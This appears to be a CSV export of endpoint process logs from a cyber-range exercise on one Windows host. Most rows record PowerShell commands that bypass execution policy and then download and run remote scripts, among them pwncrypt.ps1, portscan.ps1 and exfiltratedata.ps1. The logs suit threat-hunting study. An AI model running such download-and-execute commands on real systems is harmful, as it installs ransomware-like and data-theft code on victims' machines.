Timestamp,ProcessCommandLine,FileName,FolderPath,SHA256
"Jun 16, 2025 2:13:29 AM","""cmd"" /Cpowershell -ExecutionPolicy Unrestricted -File script4.ps1",cmd.exe,C:\Windows\System32\cmd.exe,badf4752413cb0cbdc03fb95820ca167f0cdc63b597ccdb5ef43111180e088b0
"Jun 16, 2025 2:13:29 AM",powershell  -ExecutionPolicy Unrestricted -File script4.ps1,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,9785001b0dcf755eddb8af294a373c0b87b2498660f724e76c4d53f9c217c7a3
"Jun 16, 2025 2:13:30 AM","""cmd.exe"" /c powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/pwncrypt.ps1 -OutFile C:\programdata\pwncrypt.ps1",cmd.exe,C:\Windows\System32\cmd.exe,badf4752413cb0cbdc03fb95820ca167f0cdc63b597ccdb5ef43111180e088b0
"Jun 16, 2025 2:13:30 AM",powershell.exe  -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/pwncrypt.ps1 -OutFile C:\programdata\pwncrypt.ps1,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,9785001b0dcf755eddb8af294a373c0b87b2498660f724e76c4d53f9c217c7a3
"Jun 16, 2025 2:13:33 AM","""cmd.exe"" /c powershell.exe -ExecutionPolicy Bypass -File C:\programdata\pwncrypt.ps1",cmd.exe,C:\Windows\System32\cmd.exe,badf4752413cb0cbdc03fb95820ca167f0cdc63b597ccdb5ef43111180e088b0
"Jun 16, 2025 2:13:33 AM",powershell.exe  -ExecutionPolicy Bypass -File C:\programdata\pwncrypt.ps1,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,9785001b0dcf755eddb8af294a373c0b87b2498660f724e76c4d53f9c217c7a3
"Jun 16, 2025 2:15:04 AM","powershell.exe -ExecutionPolicy AllSigned -NoProfile -NonInteractive -Command ""& {$OutputEncoding = [Console]::OutputEncoding =[System.Text.Encoding]::UTF8;$scriptFileStream = [System.IO.File]::Open('C:\ProgramData\Microsoft\Windows Defender Advanced Threat Protection\DataCollection\8799.13010684.0.13010684-44df2f8b8ed4b8bf86a33a19f943b8cbdd19f110\efc69106-6fc1-423a-94ef-221e65a28f09.ps1', [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read, [System.IO.FileShare]::Read);$calculatedHash = Microsoft.PowerShell.Utility\Get-FileHash 'C:\ProgramData\Microsoft\Windows Defender Advanced Threat Protection\DataCollection\8799.13010684.0.13010684-44df2f8b8ed4b8bf86a33a19f943b8cbdd19f110\efc69106-6fc1-423a-94ef-221e65a28f09.ps1' -Algorithm SHA256;if (!($calculatedHash.Hash -eq '3a26feba614cf2d0e0de23f730b90b20f589a191c03904d0e72c97c19a96e953')) { exit 323;}; . 'C:\ProgramData\Microsoft\Windows Defender Advanced Threat Protection\DataCollection\8799.13010684.0.13010684-44df2f8b8ed4b8bf86a33a19f943b8cbdd19f110\efc69106-6fc1-423a-94ef-221e65a28f09.ps1' }""",powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,9785001b0dcf755eddb8af294a373c0b87b2498660f724e76c4d53f9c217c7a3
"Jun 16, 2025 2:25:20 AM","""cmd"" /Cpowershell -ExecutionPolicy Unrestricted -File script5.ps1",cmd.exe,C:\Windows\System32\cmd.exe,badf4752413cb0cbdc03fb95820ca167f0cdc63b597ccdb5ef43111180e088b0
"Jun 16, 2025 2:25:20 AM",powershell  -ExecutionPolicy Unrestricted -File script5.ps1,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,9785001b0dcf755eddb8af294a373c0b87b2498660f724e76c4d53f9c217c7a3
"Jun 16, 2025 2:25:20 AM","""cmd.exe"" /c powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/eicar.ps1 -OutFile C:\programdata\eicar.ps1",cmd.exe,C:\Windows\System32\cmd.exe,badf4752413cb0cbdc03fb95820ca167f0cdc63b597ccdb5ef43111180e088b0
"Jun 16, 2025 2:25:20 AM",powershell.exe  -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/eicar.ps1 -OutFile C:\programdata\eicar.ps1,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,9785001b0dcf755eddb8af294a373c0b87b2498660f724e76c4d53f9c217c7a3
"Jun 16, 2025 2:25:24 AM","""cmd.exe"" /c powershell.exe -ExecutionPolicy Bypass -File C:\programdata\eicar.ps1",cmd.exe,C:\Windows\System32\cmd.exe,badf4752413cb0cbdc03fb95820ca167f0cdc63b597ccdb5ef43111180e088b0
"Jun 16, 2025 2:25:24 AM",powershell.exe  -ExecutionPolicy Bypass -File C:\programdata\eicar.ps1,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,9785001b0dcf755eddb8af294a373c0b87b2498660f724e76c4d53f9c217c7a3
"Jun 16, 2025 2:37:06 AM","""cmd"" /Cpowershell -ExecutionPolicy Unrestricted -File script6.ps1",cmd.exe,C:\Windows\System32\cmd.exe,badf4752413cb0cbdc03fb95820ca167f0cdc63b597ccdb5ef43111180e088b0
"Jun 16, 2025 2:37:07 AM",powershell  -ExecutionPolicy Unrestricted -File script6.ps1,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,9785001b0dcf755eddb8af294a373c0b87b2498660f724e76c4d53f9c217c7a3
"Jun 16, 2025 2:37:07 AM","""cmd.exe"" /c powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/portscan.ps1 -OutFile C:\programdata\portscan.ps1",cmd.exe,C:\Windows\System32\cmd.exe,badf4752413cb0cbdc03fb95820ca167f0cdc63b597ccdb5ef43111180e088b0
"Jun 16, 2025 2:37:07 AM",powershell.exe  -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/portscan.ps1 -OutFile C:\programdata\portscan.ps1,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,9785001b0dcf755eddb8af294a373c0b87b2498660f724e76c4d53f9c217c7a3
"Jun 16, 2025 2:37:11 AM","""cmd.exe"" /c powershell.exe -ExecutionPolicy Bypass -File C:\programdata\portscan.ps1",cmd.exe,C:\Windows\System32\cmd.exe,badf4752413cb0cbdc03fb95820ca167f0cdc63b597ccdb5ef43111180e088b0
"Jun 16, 2025 2:37:11 AM",powershell.exe  -ExecutionPolicy Bypass -File C:\programdata\portscan.ps1,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,9785001b0dcf755eddb8af294a373c0b87b2498660f724e76c4d53f9c217c7a3
"Jun 16, 2025 2:43:12 AM","powershell.exe -ExecutionPolicy AllSigned -NoProfile -NonInteractive -Command ""& {$OutputEncoding = [Console]::OutputEncoding =[System.Text.Encoding]::UTF8;$scriptFileStream = [System.IO.File]::Open('C:\ProgramData\Microsoft\Windows Defender Advanced Threat Protection\DataCollection\8799.13010684.0.13010684-44df2f8b8ed4b8bf86a33a19f943b8cbdd19f110\9bde6f2a-afcb-4c11-b890-d6a1f78e5c4b.ps1', [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read, [System.IO.FileShare]::Read);$calculatedHash = Microsoft.PowerShell.Utility\Get-FileHash 'C:\ProgramData\Microsoft\Windows Defender Advanced Threat Protection\DataCollection\8799.13010684.0.13010684-44df2f8b8ed4b8bf86a33a19f943b8cbdd19f110\9bde6f2a-afcb-4c11-b890-d6a1f78e5c4b.ps1' -Algorithm SHA256;if (!($calculatedHash.Hash -eq '46e6572a1b52c13498d2a82b92c3d0df1146f8411d335497829cd9c5d859a07c')) { exit 323;}; . 'C:\ProgramData\Microsoft\Windows Defender Advanced Threat Protection\DataCollection\8799.13010684.0.13010684-44df2f8b8ed4b8bf86a33a19f943b8cbdd19f110\9bde6f2a-afcb-4c11-b890-d6a1f78e5c4b.ps1' }""",powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,9785001b0dcf755eddb8af294a373c0b87b2498660f724e76c4d53f9c217c7a3
"Jun 16, 2025 2:49:24 AM","""cmd"" /Cpowershell -ExecutionPolicy Unrestricted -File script7.ps1",cmd.exe,C:\Windows\System32\cmd.exe,badf4752413cb0cbdc03fb95820ca167f0cdc63b597ccdb5ef43111180e088b0
"Jun 16, 2025 2:49:24 AM",powershell  -ExecutionPolicy Unrestricted -File script7.ps1,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,9785001b0dcf755eddb8af294a373c0b87b2498660f724e76c4d53f9c217c7a3
"Jun 16, 2025 2:49:25 AM","""cmd.exe"" /c powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/exfiltratedata.ps1 -OutFile C:\programdata\exfiltratedata.ps1",cmd.exe,C:\Windows\System32\cmd.exe,badf4752413cb0cbdc03fb95820ca167f0cdc63b597ccdb5ef43111180e088b0
"Jun 16, 2025 2:49:25 AM",powershell.exe  -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/exfiltratedata.ps1 -OutFile C:\programdata\exfiltratedata.ps1,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,9785001b0dcf755eddb8af294a373c0b87b2498660f724e76c4d53f9c217c7a3
"Jun 16, 2025 2:49:29 AM","""cmd.exe"" /c powershell.exe -ExecutionPolicy Bypass -File C:\programdata\exfiltratedata.ps1",cmd.exe,C:\Windows\System32\cmd.exe,badf4752413cb0cbdc03fb95820ca167f0cdc63b597ccdb5ef43111180e088b0
"Jun 16, 2025 2:49:29 AM",powershell.exe  -ExecutionPolicy Bypass -File C:\programdata\exfiltratedata.ps1,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,9785001b0dcf755eddb8af294a373c0b87b2498660f724e76c4d53f9c217c7a3
"Jun 16, 2025 3:13:25 AM","powershell.exe -ExecutionPolicy AllSigned -NoProfile -NonInteractive -Command ""& {$OutputEncoding = [Console]::OutputEncoding =[System.Text.Encoding]::UTF8;$scriptFileStream = [System.IO.File]::Open('C:\ProgramData\Microsoft\Windows Defender Advanced Threat Protection\DataCollection\8799.13010684.0.13010684-44df2f8b8ed4b8bf86a33a19f943b8cbdd19f110\7b060674-6027-411f-86aa-13a75308bdb2.ps1', [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read, [System.IO.FileShare]::Read);$calculatedHash = Microsoft.PowerShell.Utility\Get-FileHash 'C:\ProgramData\Microsoft\Windows Defender Advanced Threat Protection\DataCollection\8799.13010684.0.13010684-44df2f8b8ed4b8bf86a33a19f943b8cbdd19f110\7b060674-6027-411f-86aa-13a75308bdb2.ps1' -Algorithm SHA256;if (!($calculatedHash.Hash -eq '45f85dba018d9c516d006f6765b6c3bd9aedcf5fb8f0c5f587384683e9d26a25')) { exit 323;}; . 'C:\ProgramData\Microsoft\Windows Defender Advanced Threat Protection\DataCollection\8799.13010684.0.13010684-44df2f8b8ed4b8bf86a33a19f943b8cbdd19f110\7b060674-6027-411f-86aa-13a75308bdb2.ps1' }""",powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,9785001b0dcf755eddb8af294a373c0b87b2498660f724e76c4d53f9c217c7a3
"Jun 16, 2025 3:38:58 AM","powershell.exe -ExecutionPolicy AllSigned -NoProfile -NonInteractive -Command ""& {$OutputEncoding = [Console]::OutputEncoding =[System.Text.Encoding]::UTF8;$scriptFileStream = [System.IO.File]::Open('C:\ProgramData\Microsoft\Windows Defender Advanced Threat Protection\DataCollection\8799.13010684.0.13010684-44df2f8b8ed4b8bf86a33a19f943b8cbdd19f110\2d76cc84-8291-481d-845d-62f59f16e445.ps1', [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read, [System.IO.FileShare]::Read);$calculatedHash = Microsoft.PowerShell.Utility\Get-FileHash 'C:\ProgramData\Microsoft\Windows Defender Advanced Threat Protection\DataCollection\8799.13010684.0.13010684-44df2f8b8ed4b8bf86a33a19f943b8cbdd19f110\2d76cc84-8291-481d-845d-62f59f16e445.ps1' -Algorithm SHA256;if (!($calculatedHash.Hash -eq 'f95968729fbed81725f1995adf545a51e638f50d5161e28e1cdab9008369f4d9')) { exit 323;}; . 'C:\ProgramData\Microsoft\Windows Defender Advanced Threat Protection\DataCollection\8799.13010684.0.13010684-44df2f8b8ed4b8bf86a33a19f943b8cbdd19f110\2d76cc84-8291-481d-845d-62f59f16e445.ps1' }""",powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,9785001b0dcf755eddb8af294a373c0b87b2498660f724e76c4d53f9c217c7a3
"Jun 16, 2025 3:45:58 AM","powershell.exe -ExecutionPolicy AllSigned -NoProfile -NonInteractive -Command ""& {$OutputEncoding = [Console]::OutputEncoding =[System.Text.Encoding]::UTF8;$scriptFileStream = [System.IO.File]::Open('C:\ProgramData\Microsoft\Windows Defender Advanced Threat Protection\DataCollection\8799.13010684.0.13010684-44df2f8b8ed4b8bf86a33a19f943b8cbdd19f110\100c7519-406d-49cb-b7eb-41ce85513276.ps1', [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read, [System.IO.FileShare]::Read);$calculatedHash = Microsoft.PowerShell.Utility\Get-FileHash 'C:\ProgramData\Microsoft\Windows Defender Advanced Threat Protection\DataCollection\8799.13010684.0.13010684-44df2f8b8ed4b8bf86a33a19f943b8cbdd19f110\100c7519-406d-49cb-b7eb-41ce85513276.ps1' -Algorithm SHA256;if (!($calculatedHash.Hash -eq '6c6ea1d381021fe9293161b8df84348fd0114ddc01facba51484fb9647a4c4b5')) { exit 323;}; . 'C:\ProgramData\Microsoft\Windows Defender Advanced Threat Protection\DataCollection\8799.13010684.0.13010684-44df2f8b8ed4b8bf86a33a19f943b8cbdd19f110\100c7519-406d-49cb-b7eb-41ce85513276.ps1' }""",powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,9785001b0dcf755eddb8af294a373c0b87b2498660f724e76c4d53f9c217c7a3
